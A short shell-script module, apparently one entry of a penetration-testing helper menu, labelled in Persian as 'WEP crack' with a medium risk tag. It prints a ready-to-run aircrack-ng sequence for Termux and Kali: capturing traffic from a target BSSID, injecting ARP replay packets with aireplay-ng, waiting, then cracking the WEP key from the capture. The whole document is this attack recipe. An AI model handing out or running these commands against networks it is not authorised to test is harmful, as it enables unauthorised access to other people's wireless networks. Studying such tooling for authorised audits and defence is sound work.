DESC="کرک WEP"
RISK="MED"

termux(){ echo "su -c 'airodump-ng -c <CH> --bssid <BSSID> -w wep wlan0'"; }

kali(){
cat <<'EOF'
sudo airodump-ng -c <CH> --bssid <BSSID> -w wep wlan0mon
sudo aireplay-ng -3 -b <BSSID> wlan0mon
sleep 120
aircrack-ng wep-01.cap
EOF
}
